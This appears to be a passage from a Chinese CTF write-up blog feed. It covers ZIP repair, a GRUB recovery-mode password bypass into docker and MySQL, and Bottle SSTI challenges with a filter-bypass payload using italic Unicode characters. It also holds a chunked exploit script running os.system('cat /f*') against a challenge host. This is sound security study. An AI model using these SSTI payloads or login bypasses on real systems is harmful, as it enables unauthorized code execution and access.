00,都是保持一致的,所以可以直接将压缩源文件数据区的十六进制数据复制填入压缩源</p><p>文件目录区表示文件名长度的08 00前即可</p><p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-12.png"></p><p>修改成功后解压拿到flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">TGCTF</span><span class="hljs-template-variable">&#123;Warrior_You_have_defeated_the_giant_dragon!&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs tap">一个 ZIP 文件由三个部分组成：<br>        压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志<br><br>    1、压缩源文件数据区<br><br>    在这个数据区中每一个压缩的源文件/目录都是一条记录，记录的格式如下：<br>      <br><br>       [文件头+ 文件数据 + 数据描述符]<br> <br>       a、文件头结构<br><br>         组成    　                长度<br>      文件头标记                 <span class="hljs-number"> 4 </span>bytes  (0x04034b50)<br>      解压文件所需 pkware 版本   <span class="hljs-number"> 2 </span>bytes<br>      全局方式位标记             <span class="hljs-number"> 2 </span>bytes<br>  　　压缩方式                   <span class="hljs-number"> 2 </span>bytes<br>  　　最后修改文件时间            <span class="hljs-number"> 2 </span>bytes<br> 　　 最后修改文件日期            <span class="hljs-number"> 2 </span>bytes<br> 　　 CRC-32校验                 <span class="hljs-number"> 4 </span>bytes<br> 　 　压缩后尺寸                 <span class="hljs-number"> 4 </span>bytes<br> 　 　未压缩尺寸                 <span class="hljs-number"> 4 </span>bytes<br> 　　 文件名长度                 <span class="hljs-number"> 2 </span>bytes<br><br>      扩展记录长度               <span class="hljs-number"> 2 </span>bytes<br> 　　 文件名                     （不定长度）<br> 　　 扩展字段                   （不定长度）<br><br>      <br><br>      <br>        b、文件数据<br><br><br>       <br><br>        c、数据描述符<br><br> 　　　组成    　长度<br>  　　CRC-32校验                 <span class="hljs-number"> 4 </span>bytes<br>  　　压缩后尺寸                  <span class="hljs-number"> 4 </span>bytes<br> 　 　未压缩尺寸                  <span class="hljs-number"> 4 </span>bytes<br><br>      这个数据描述符只在全局方式位标记的第３位设为１时才存在（见后详解），紧接在压缩数据的最后一个字节后。这个数据描述符只用在不能对输出的 ZIP 文件进行检索时使用。例如：在一个不能检索的驱动器（如：磁带机上）上的 ZIP 文件中。如果是磁盘上的ZIP文件一般没有这个数据描述符。<br><br>     2、压缩源文件目录区<br><br>     在这个数据区中每一条纪录对应在压缩源文件数据区中的一条数据<br><br><br>   　　　组成               　            长度<br>    　　目录中文件文件头标记            <span class="hljs-number"> 4 </span>bytes  (0x02014b50)<br>    　　压缩使用的　pkware 版本         <span class="hljs-number"> 2 </span>bytes<br>    　　解压文件所需 pkware 版本        <span class="hljs-number"> 2 </span>bytes<br>    　　全局方式位标记                  <span class="hljs-number"> 2 </span>bytes<br>    　　压缩方式                       <span class="hljs-number"> 2 </span>bytes<br>    　　最后修改文件时间                <span class="hljs-number"> 2 </span>bytes<br>    　　最后修改文件日期                <span class="hljs-number"> 2 </span>bytes<br>    　　ＣＲＣ－３２校验                <span class="hljs-number"> 4 </span>bytes<br>    　　压缩后尺寸                     <span class="hljs-number"> 4 </span>bytes<br>    　　未压缩尺寸                     <span class="hljs-number"> 4 </span>bytes<br>    　　文件名长度                     <span class="hljs-number"> 2 </span>bytes<br>    　　扩展字段长度                   <span class="hljs-number"> 2 </span>bytes<br>    　　文件注释长度                   <span class="hljs-number"> 2 </span>bytes<br>    　　磁盘开始号                     <span class="hljs-number"> 2 </span>bytes<br>    　　内部文件属性                   <span class="hljs-number"> 2 </span>bytes<br>    　　外部文件属性                   <span class="hljs-number"> 4 </span>bytes<br>        局部头部偏移量                 <span class="hljs-number"> 4 </span>bytes<br>    　　文件名                       （不定长度）<br>    　　扩展字段                     （不定长度）<br>        文件注释                     （不定长度）<br>    3、压缩源文件目录结束标志<br><br>    　　　组成               　          长度<br>        目录结束标记                   <span class="hljs-number"> 4 </span>bytes  (0x02014b50)<br>        当前磁盘编号                   <span class="hljs-number"> 2 </span>bytes<br>        目录区开始磁盘编号             <span class="hljs-number"> 2 </span>bytes<br>    　　本磁盘上纪录总数                <span class="hljs-number"> 2 </span>bytes<br>    　　目录区中纪录总数                <span class="hljs-number"> 2 </span>bytes<br>    　　目录区尺寸大小                  <span class="hljs-number"> 4 </span>bytes<br>    　　目录区对第一张磁盘的偏移量       <span class="hljs-number"> 4 </span>bytes<br>    　　ZIP 文件注释长度                <span class="hljs-number"> 2 </span>bytes<br>    　　ZIP 文件注释                   （不定长度）<br></code></pre></td></tr></table></figure><hr><h2 id="TeamGipsy-ctfer"><a href="#TeamGipsy-ctfer" class="headerlink" title="TeamGipsy&amp;ctfer"></a><strong>TeamGipsy&amp;ctfer</strong></h2><p>1.其实这题很简单，给全了虚拟机配置文件，直接VM打开，发现要密 码，直接Linux登陆</p><p>绕过 绕过方法：长按shift进入GRUB，选择advanced options for ubuntu，选择</p><p>recovery mode，进入菜单 选择root，press enter，输入passwd hznuctfer，输入</p><p>密码，重启（reboot）</p><hr><p>2.输入重新设置的密码，成功进入，桌面直接看到mimi,txt。点开就可以发现像是命令行</p><p>history，分析 一下就可以看到其实就是开了两个docker容器，显而易见下一步就是进到</p><p>容器里找东西</p><hr><p>3.直接运行创建容器的命令，得到原有的镜像ID（因为会自动报错，回显已经占用的ID)，</p><p>docker start 9e7aa，可以看到mysql类型的容器TeamGipsyctf1已经开启，同样方法</p><p>开启TeamGipsyctf2</p><hr><p>4.docker exec -it ID &#x2F;bin&#x2F;bash命令进入对应容器 启动mysql mysql -uroot</p><p>-p，密码就在mimi.txt中，输入password_is_me，进入数据库，show databases;</p><p>发现特殊database，use TeamGipsy;</p><hr><p>5.show tables; 看表名，CTF和TG选一个找，最终在TG的flaghere中得到flag 语句：</p><p>select * from TG</p><hr><p>还有另一种解法，不需要用到docke操作</p><p>狂按ESC键进到GRUP里面，加一个single</p><p>成功进入终端</p><p>发现用户桌面有个mimi.txt</p><p>是history历史操作，对docker有操作，目前终端docker没有启动，passwd改一下用户的密码，exit退出single模式进入系统，方便操作</p><p>​docker image list只有个mysql的镜像，其他的应该是被删了</p><p>​于是猜想flag应在在docker镜像的目录里面</p><p>​由于没学过docker的文件结构</p><p>​直接grep搜索找一下flag，注意sudo</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">grep -<span class="hljs-attribute">r</span> CTF&#123; /<span class="hljs-selector-tag">var</span>/lib/docker<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> upload </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 比赛复现 </tag>
            
            <tag> RCE </tag>
            
            <tag> CVE </tag>
            
            <tag> 目录穿越 </tag>
            
            <tag> 内存马 </tag>
            
            <tag> 时间盲注 </tag>
            
            <tag> 明文攻击 </tag>
            
            <tag> 压缩文件修复 </tag>
            
            <tag> 时间帧隐写 </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF-出题人又疯</title>
      <link href="/2025/04/14/XYCTF-%E5%87%BA%E9%A2%98%E4%BA%BA%E5%8F%88%E7%96%AF/"/>
      <url>/2025/04/14/XYCTF-%E5%87%BA%E9%A2%98%E4%BA%BA%E5%8F%88%E7%96%AF/</url>
      
        <content type="html"><![CDATA[<p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   app.py</span><br><span class="hljs-string">@Time    :   2025/03/29 15:52:17</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> bottle<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, World!&#x27;</span><br>blacklist = [<br>    <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span> <br>]<br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/attack&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    payload = bottle.request.query.get(<span class="hljs-string">&#x27;payload&#x27;</span>)<br>    <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(payload) &lt; <span class="hljs-number">25</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">all</span>(c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist):<br>        <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-keyword">return</span> bottle.template(<span class="hljs-string">&#x27;hello &#x27;</span>+payload)<br>    <span class="hljs-keyword">else</span>:<br>        bottle.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Invalid payload&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    bottle.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br></code></pre></td></tr></table></figure><p>过滤了更多的字符。没办法用之前的方法了。</p><p>但是可以用斜体字绕过</p><p>python中有如下特性：</p><p><img src="/../image/XYCTF-%E5%87%BA%E9%A2%98%E4%BA%BA%E5%8F%88%E7%96%AF-1.png"></p><p>可以用斜体文字绕过</p><p>payload：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl">𝓸<span class="hljs-function"><span class="hljs-title">pen</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).read()</span><br></code></pre></td></tr></table></figure><p>报错了，本地调试一下，发现url传参的时候把斜体的𝓸解析成了两个字符。</p><p>如图</p><p><img src="/../image/XYCTF-%E5%87%BA%E9%A2%98%E4%BA%BA%E5%8F%88%E7%96%AF-2.png"></p><p>可以看到斜体的o被解析成了%C2%BA</p><p>其实这里是一个URL解码的小坑。一个%BA就足够了。我们删除%C2即可。</p><p>对字符a，同理。替换为%aa</p><p>最终payload：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">/attack?payload=</span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">BApen</span>(%<span class="hljs-name">27/flag</span>%<span class="hljs-number">27</span>).re%aad()&#125;&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ssti </tag>
            
            <tag> 比赛复现 </tag>
            
            <tag> bottle框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF-出题人已疯</title>
      <link href="/2025/04/14/XYCTF-%E5%87%BA%E9%A2%98%E4%BA%BA%E5%B7%B2%E7%96%AF/"/>
      <url>/2025/04/14/XYCTF-%E5%87%BA%E9%A2%98%E4%BA%BA%E5%B7%B2%E7%96%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="XYCTF-出题人已疯"><a href="#XYCTF-出题人已疯" class="headerlink" title="XYCTF-出题人已疯"></a>XYCTF-出题人已疯</h1><p>由于找不到bottle相关的资料，直接”借鉴fuboy”的题解了</p><p>知识点：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">bottle的ssti注入<br></code></pre></td></tr></table></figure><p>源码：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"># -<span class="hljs-strong">*- encoding: utf-8 -*</span>-<br>&#x27;&#x27;&#x27;<br>@File    :   app.py<br>@Time    :   2025/03/29 15:52:17<br>@Author  :   LamentXU <br>&#x27;&#x27;&#x27;<br>import bottle<br>&#x27;&#x27;&#x27;<br>flag in /flag<br>&#x27;&#x27;&#x27;<br>@bottle.route(<span class="hljs-emphasis">&#x27;/&#x27;</span>)<br>def index():<br><span class="hljs-code">    return &#x27;Hello, World!&#x27;</span><br>@bottle.route(<span class="hljs-emphasis">&#x27;/attack&#x27;</span>)<br>def attack():<br><span class="hljs-code">    payload = bottle.request.query.get(&#x27;payload&#x27;)</span><br><span class="hljs-code">    if payload and len(payload) &lt; 25 and &#x27;open&#x27; not in payload and &#x27;\\&#x27; not in payload:</span><br><span class="hljs-code">        return bottle.template(&#x27;hello &#x27;+payload)</span><br><span class="hljs-code">    else:</span><br><span class="hljs-code">        bottle.abort(400, &#x27;Invalid payload&#x27;)</span><br>if <span class="hljs-emphasis">__name__</span> == <span class="hljs-emphasis">&#x27;__main__&#x27;</span>:<br><span class="hljs-code">    bottle.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></code></pre></td></tr></table></figure><p>我们在attack路由里输入?payload&#x3D;4</p><p>检验到了有ssti漏洞</p><h3 id="bottle的ssti"><a href="#bottle的ssti" class="headerlink" title="bottle的ssti"></a>bottle的ssti</h3><h4 id="和jinja2的区别"><a href="#和jinja2的区别" class="headerlink" title="和jinja2的区别:"></a>和jinja2的区别:</h4><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">Bottle:</span><br><span class="language-xml">使用简单的</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">python表达式</span>&#125;&#125;</span><span class="language-xml">语法</span><br><span class="language-xml">例如：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">1</span>+<span class="hljs-number">1</span>&#125;&#125;</span><span class="language-xml"> 或 </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">__import__</span>(<span class="hljs-name">&#x27;os&#x27;</span>).system(<span class="hljs-name">&#x27;id&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">Jinja2:</span><br><span class="language-xml">使用更复杂的模板语法</span><br><span class="language-xml">例如：</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">config.items</span>() &#125;&#125;</span><span class="language-xml"> 或 </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[1].__subclasses__() &#125;&#125;</span><br></code></pre></td></tr></table></figure><p>简述：<strong>bottle的SSTI可以直接访问到内部类</strong></p><p>一般payload:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;命令&#x27;</span>)</span><br></code></pre></td></tr></table></figure><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p>直接用bottle的ssti利用脚本：</p><p>官方exp：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><br>url = <span class="hljs-string">&#x27;http://gz.imxbt.cn:20256/attack&#x27;</span><br><br><br>payload = <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&gt;123&#x27;)&quot;</span><br><br><br>p = [payload[i:i+3] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,len(payload),3)]<br>flag = <span class="hljs-literal">True</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> p:<br>    <span class="hljs-keyword">if</span> flag:<br>        tmp = f<span class="hljs-string">&#x27;\n%import os;os.a=&quot;&#123;i&#125;&quot;&#x27;</span><br>        flag = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        tmp = f<span class="hljs-string">&#x27;\n%import os;os.a+=&quot;&#123;i&#125;&quot;&#x27;</span><br>    r = requests.<span class="hljs-built_in">get</span>(url,params=&#123;<span class="hljs-string">&quot;payload&quot;</span>:tmp&#125;)<br><br>r = requests.<span class="hljs-built_in">get</span>(url,params=&#123;<span class="hljs-string">&quot;payload&quot;</span>:<span class="hljs-string">&quot;\n%import os;eval(os.a)&quot;</span>&#125;)<br>r = requests.<span class="hljs-built_in">get</span>(url,params=&#123;<span class="hljs-string">&quot;payload&quot;</span>:<span class="hljs-string">&quot;\n%include(&#x27;123&#x27;)&quot;</span>&#125;).text<br><span class="hljs-built_in">print</span>(r)<br></code></pre></td></tr></table></figure><p>输出：</p><p>&#x2F;&#x2F;hello<br>flag{L@men7XU_d0es_n0t_w@nt_t0_g0_t0_scho01}</p><p>分析：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">p</span> = <span class="hljs-selector-attr">[payload[i:i+3]</span> <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(payload), <span class="hljs-number">3</span>)]<br><span class="hljs-comment">//分块传输Payload（规避过滤）</span><br>将Payload 每<span class="hljs-number">3</span>个字符分割，例如：<span class="hljs-string">&quot;__i&quot;</span>, <span class="hljs-string">&quot;mpo&quot;</span>, <span class="hljs-string">&quot;rt_&quot;</span>, ...<br>目的是 绕过可能的长度限制或关键字过滤（如__import__可能被拦截）。<br></code></pre></td></tr></table></figure><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pf">flag = True<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> p:<br>    if flag:<br>        tmp = f&#x27;\n%import <span class="hljs-keyword">os</span>;<span class="hljs-keyword">os</span>.a=<span class="hljs-string">&quot;&#123;i&#125;&quot;</span>&#x27;  <span class="hljs-comment"># 初始化 os.a</span><br>        flag = False<br>    else:<br>        tmp = f&#x27;\n%import <span class="hljs-keyword">os</span>;<span class="hljs-keyword">os</span>.a+=<span class="hljs-string">&quot;&#123;i&#125;&quot;</span>&#x27;  <span class="hljs-comment"># 追加到 os.a</span><br>    r = requests.get(url, params=&#123;<span class="hljs-string">&quot;payload&quot;</span>: tmp&#125;)<br>    <br>//逐块发送Payload<br>\n% 是 Bottle模板的语法，类似于Jinja2的&#123;&#123; &#125;&#125;，但Bottle允许直接执行Python代码。<br>import <span class="hljs-keyword">os</span>;<span class="hljs-keyword">os</span>.a=<span class="hljs-string">&quot;...&quot;</span>：第一次请求：初始化 <span class="hljs-keyword">os</span>.a 为第一个分块（如<span class="hljs-string">&quot;__i&quot;</span>）。<br>后续请求：用 += 拼接剩余分块（如<span class="hljs-string">&quot;mpo&quot;</span>、<span class="hljs-string">&quot;rt_&quot;</span>...）。<br>最终，<span class="hljs-keyword">os</span>.a 会存储完整的Payload：<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f*&gt;123&#x27;)&quot;</span>。<br></code></pre></td></tr></table></figure><p>即如果服务器 <strong>保持会话状态</strong>（如<code>os.a</code>变量未被清除），可以尝试：</p><p><strong>分多次提交短Payload</strong>，存储到某个变量：</p><ul><li><code>&#123;&#123;a="__imp"&#125;&#125;</code></li><li><code>&#123;&#123;a+="ort__"&#125;&#125;</code></li><li><code>&#123;&#123;a+="('os')"&#125;&#125;</code></li><li><code>&#123;&#123;eval(a)&#125;&#125;</code>（最终执行<code>__import__(&#39;os&#39;)</code>）</li></ul><h3 id="通过斜体字绕过"><a href="#通过斜体字绕过" class="headerlink" title="通过斜体字绕过"></a>通过斜体字绕过</h3><p><a href="https://www.cnblogs.com/LAMENTXU/articles/18805019">聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass - LamentXU - 博客园</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ssti </tag>
            
            <tag> 比赛复现 </tag>
            
            <tag> bottle框架 </tag>
            
            <tag> 长度过滤绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python反序列化</title>
      <link href="/2025/04/14/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/04/14/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="python反序列化漏洞以及JSON模块和pickle模块"><a href="#python反序列化漏洞以及JSON模块和pickle模块" class="headerlink" title="python反序列化漏洞以及JSON模块和pickle模块"></a>python反序列化漏洞以及JSON模块和pickle模块</h1><h2 id="序列化是什么"><a href="#序列化是什么" class="headerlink" title="序列化是什么"></a>序列化是什么</h2><p><strong>序列化</strong> (Serialization)是将<strong>对象的状态信息</strong>转换为<strong>可以存储或传输的形式</strong>的过程。</p><h2 id="反序列化是什么"><a href="#反序列化是什么" class="headerlink" title="反序列化是什么"></a>反序列化是什么</h2><p><strong>反序列化</strong> (Deserialization)是将<strong>有序的二进制序列</strong>转换成<strong>某种对象</strong>（字典，列表等）的过程。</p><h2 id="为什么要序列化？"><a href="#为什么要序列化？" class="headerlink" title="为什么要序列化？"></a>为什么要序列化？</h2><p><strong>1、存储</strong></p><p>一个软件&#x2F;程序的执行就在处理一系列状态的变化。</p><p>在编程语言中，“状态”会以各种各样有结构的<strong>数据类型</strong>(也可简单的理解为<strong>变量</strong>)的形式被保存在内存中。</p><p><strong>内存</strong>无法永久保存数据，当程序运行一段时间，断电或者重启程序，内存中关于这个程序的一些数据就被<strong>清空</strong>了。</p><p>在断电或重启程序之前将程序当前内存中所有的数据都<strong>保存</strong>下来，以便于下次程序执行能够从文件中载入之前的数据就是<strong>序列化</strong>。</p><p><strong>2、传输</strong></p><p>因为TCP&#x2F;IP协议<strong>只支持字节数组</strong>的传输，不能直接传<strong>对象</strong>。</p><p>对象序列化的结果一定是字节数组！</p><p>当两个进程在进行远程通信时，彼此可以发送各种类型的数据。无论是何种类型的数据，都会以<strong>二进制序列</strong>的形式在网络上传送。</p><p>发送方需要把这个对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为对象。</p><p>如果收发的双方约定好实用一种序列化的格式，那么便<strong>打破了平台&#x2F;语言差异化</strong>带来的限制，实现了<strong>跨平台数据交互</strong>！</p><hr><h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><p><strong>JSON(JavaScript Object Notation, JS 对象简谱)</strong> 是一种轻量级的<strong>数据交换格式</strong>。</p><p>采用完全独立于编程语言的文本格式来存储和表示数据。</p><p>简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。</p><p>易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。</p><p>JSON表示出来就是一个<strong>字符串</strong>，<strong>可以被所有语言读取</strong>，也可以方便地<strong>存储</strong>到磁盘或者通过网络<strong>传输</strong>。</p><p>JSON不仅是标准格式，并且比XML更快，而且可以<strong>直接在Web页面中读取</strong>，非常方便。</p><h2 id="JSON模块"><a href="#JSON模块" class="headerlink" title="JSON模块"></a>JSON模块</h2><p>Python3 中可以使用 json 模块来对 JSON 数据进行编解码，它主要提供了四个方法： dump、dumps、load、loads。</p><p>dump和dumps对python对象进行<strong>序列化</strong>。将一个Python对象进行JSON格式的编码。</p><p>load和loads反序列化方法，将json格式数据解码为Python对象。</p><hr><h2 id="JSON模块实例"><a href="#JSON模块实例" class="headerlink" title="JSON模块实例"></a>JSON模块实例</h2><h3 id="dump和dumps函数"><a href="#dump和dumps函数" class="headerlink" title="dump和dumps函数"></a>dump和dumps函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># dumps可以格式化所有的基本数据类型为字符串</span><br>data1 = json.dumps([])         <span class="hljs-comment"># 列表</span><br><span class="hljs-built_in">print</span>(data1, <span class="hljs-built_in">type</span>(data1))<br>data2 = json.dumps(<span class="hljs-number">2</span>)          <span class="hljs-comment"># 数字</span><br><span class="hljs-built_in">print</span>(data2, <span class="hljs-built_in">type</span>(data2))<br>data3 = json.dumps(<span class="hljs-string">&#x27;3&#x27;</span>)        <span class="hljs-comment"># 字符串</span><br><span class="hljs-built_in">print</span>(data3, <span class="hljs-built_in">type</span>(data3))<br><span class="hljs-built_in">dict</span> = &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Tom&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">18</span>&#125;   <span class="hljs-comment"># 字典</span><br>data4 = json.dumps(<span class="hljs-built_in">dict</span>)<br><span class="hljs-built_in">print</span>(data4, <span 